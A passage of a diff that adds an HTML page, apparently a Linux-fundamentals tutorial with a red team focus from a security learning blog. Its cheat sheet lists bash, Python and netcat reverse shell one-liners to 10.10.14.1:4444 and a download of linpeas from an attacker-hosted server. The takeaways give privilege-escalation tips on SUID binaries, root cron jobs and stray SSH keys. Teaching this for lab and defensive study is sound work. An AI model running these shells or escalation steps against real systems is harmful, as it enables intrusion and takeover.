+EOF
+
+# Networking without tools
+# TCP connection via /dev/tcp (bash built-in)
+exec 3&lt;&gt;/dev/tcp/10.10.10.5/80
+echo -e &#34;GET / HTTP/1.1\r\nHost: 10.10.10.5\r\n\r\n&#34; &gt;&amp;3
+cat &lt;&amp;3
+
+# Reverse shell one-liners
+bash -i &gt;&amp; /dev/tcp/10.10.14.1/4444 0&gt;&amp;1
+python3 -c &#39;import socket,subprocess,os; s=socket.socket(); s.connect((&#34;10.10.14.1&#34;,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;])&#39;
+nc -e /bin/bash 10.10.14.1 4444
+
+# Transfer files without SCP
+# Python HTTP server
+python3 -m http.server 8080
+# Download on target
+wget http://10.10.14.1:8080/linpeas.sh
+curl -sO http://10.10.14.1:8080/linpeas.sh
+
+# Find and replace in-place
+sed -i &#39;s/old/new/g&#39; file.txt
+
+# Multi-line output to file
+tee /tmp/results.txt &lt;&lt; &#39;EOF&#39;
+line 1
+line 2
+EOF
+
+# Timing a command
+time nmap -T4 -F 10.10.10.5
+
+# Watch a command repeatedly
+watch -n 2 &#39;ss -tlnp&#39;
+
+# Count unique lines
+cat access.log | awk &#39;{print $1}&#39; | sort -u | wc -l</code></pre>
+        </div>
+
+      
+    
+
+      
+        
+        
+        <div class="block heading-block heading-level-2">
+          <h2 class="section-heading">
+            <span class="heading-index">16</span>
+            <span class="heading-text">Key Takeaways</span>
+          </h2>
+        </div>
+
+      
+    
+
+      
+        <div class="block text-block"><p><strong>Concepts to have cold:</strong></p>
+<ul>
+<li>Filesystem hierarchy — where things live and why it matters for finding credentials and writable paths</li>
+<li>Permission model — read/write/execute for owner/group/others in octal; SUID/SGID/sticky as special cases</li>
+<li>UID 0 = root regardless of username — always check <code>/etc/passwd</code> for multiple UID 0 entries</li>
+<li>Everything is a file — devices, sockets, process info in <code>/proc</code>, pipes</li>
+<li><code>sudo -l</code> is the first thing you run after getting a shell</li>
+<li>SUID binaries + GTFOBins is a solved problem — if it's on the list, it's exploitable</li>
+<li>Cron jobs run silently and automatically — writable scripts called by root cron = privesc</li>
+<li>Logs tell the full story — both for blue team analysis and red team credential hunting</li>
+<li>SSH keys last forever unless revoked — always check <code>authorized_keys</code>, always check for stray private keys</li>
+<li>A dumb shell without TTY will break everything — always upgrade with <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code> immediately</li>
+</ul>
+<p><strong>Tools to know:</strong><br>
+<code>find</code>, <code>grep</code>, <code>awk</code>, <code>sed</code>, <code>ss</code>, <code>ps</code>, <code>systemctl</code>, <code>crontab</code>, <code>sudo</code>, <code>id</code>, <code>linpeas</code>, <code>pspy</code>, <code>ssh</code>, <code>scp</code>, <code>nc</code>, <code>curl</code></p>
+<p>Linux mastery is cumulative. Every command you understand at the conceptual level — not just by copying it — makes the next one faster to learn. The shell is a force multiplier: the same fluency that makes you a fast sysadmin makes you a fast attacker and a fast defender.</p></div>
+
+      
+    
+  </div>
+
+  
+  
+
+
+  </div>
+
+  <nav id="tocBar" class="toc-bar" hidden></nav>
+
+</article>
+
+<button id="backToTop" hidden aria-label="Back to top">
+  <svg class="bt-ring" width="40" height="40" viewBox="0 0 40 40" aria-hidden="true">
+    <circle class="bt-ring-bg" cx="20" cy="20" r="17" fill="none" stroke-width="2"/>
+    <circle class="bt-ring-fg" cx="20" cy="20" r="17" fill="none" stroke-width="2"
+            stroke-dasharray="106.8" stroke-dashoffset="106.8"/>
+  </svg>
+  <svg class="bt-arrow" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="M12 19V5M5 12l7-7 7 7"/>
+  </svg>
+</button>
+
+
+
+
+<section class="related-posts">
+  <div class="section-header">
+    <span class="section-label">// related</span>
+    <span class="section-line"></span>
+  </div>
+  <div class="related-grid">
+    
+      
+      <a href="/axiom-blog-site/post/windows-fundamentals" class="post-card post-card-related card-cat-learn">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-learn">Learn</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">Windows Fundamentals — The Complete Foundation</h2>
+          <div class="post-card-meta"><time>2026-06-04</time></div>
+          <p class="post-card-summary">Architecture, filesystem, registry, users, NTFS permissions, processes, services, PowerShell, Active Directory, event logs, and a red team lens on every layer.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/networking-subnetting-fundamentals" class="post-card post-card-related card-cat-learn">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-learn">Learn</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">Networking &amp; Subnetting — The Complete Foundation</h2>
+          <div class="post-card-meta"><time>2026-06-04</time></div>
+          <p class="post-card-summary">OSI model, TCP/IP stack, IPv4 addressing, CIDR subnetting, protocols, ARP, routing, NAT, VLANs, and a red team lens on every layer.</p>
+        </div>
+      </a>
+    
+      
+      <a href="/axiom-blog-site/post/databases-fundamentals" class="post-card post-card-related card-cat-learn">
+        <div class="post-card-body">
+          <div class="post-card-toprow">
+            <div class="post-card-badges">
+              
+                <span class="cat-badge cat-learn">Learn</span>
+              
+            </div>
+          </div>
+          <h2 class="post-card-title">Databases — The Complete Foundation</h2>
+          <div class="post-card-meta"><time>2026-06-04</time></div>
+          <p class="post-card-summary">Relational and NoSQL database fundamentals, SQL from scratch, MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MongoDB, Redis, and Cassandra — with red team perspectives on enumeration, default credentials, privilege escalation, credential extraction, and SQL injection for every major engine.</p>
+        </div>
+      </a>
+    
+  </div>
+</section>
+
+
+
+
+    </div>
+  </main>
+
+  <nav class="mobile-bottom-nav">
+    <a href="/axiom-blog-site/" aria-label="Home">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/>
+      </svg>
+      <span>Home</span>
+    </a>
+    <button type="button" id="mobileBottomSearch" aria-label="Search">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
+      </svg>
+      <span>Search</span>
+    </button>
+    <a href="/axiom-blog-site/#categories" aria-label="Categories">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/>
+      </svg>
+      <span>Categories</span>
+    </a>
+  </nav>
+
+  <footer class="site-footer">
+    <div class="container">
+      <div class="footer-left">
+        <a href="/axiom-blog-site/" class="footer-brand">Axiom</a>
+      </div>
+      <nav class="footer-nav">
+        <a href="/axiom-blog-site/about" class="footer-link">About</a>
+        <a href="/axiom-blog-site/tags" class="footer-link">Tags</a>
+        <a href="/axiom-blog-site/privacy" class="footer-link">Privacy</a>
+        <a href="/axiom-blog-site/feed.xml" class="footer-link">RSS</a>
+      </nav>
+    </div>
+  </footer>
+
+  <script src="/axiom-blog-site/static/js/highlight.min.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/hljs-powershell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-x86asm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dos.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-http.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nginx.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-apache.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dockerfile.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-armasm.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-awk.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-cmake.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-coffeescript.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-dart.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-elixir.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-erlang.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fortran.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-fsharp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-gradle.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-groovy.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-haskell.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-kotlin.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-latex.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-lisp.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-nix.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-ocaml.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-pgsql.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-protobuf.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-scala.min.js"></script>
+  <script src="/axiom-blog-site/static/js/hljs-vim.min.js"></script>
+  <script src="/axiom-blog-site/static/js/search.js?v=1"></script>
+  <script src="/axiom-blog-site/static/js/animations.js?v=3"></script>
+  
+  <script src="/axiom-blog-site/static/js/crypto.js?v=2"></script>
+  <script src="/axiom-blog-site/static/js/app.js?v=3"></script>
+  <script src="/axiom-blog-site/static/js/toc.js?v=7"></script>
+  <script src="/axiom-blog-site/static/js/post.js?v=4"></script>
+
+</body>
+</html>
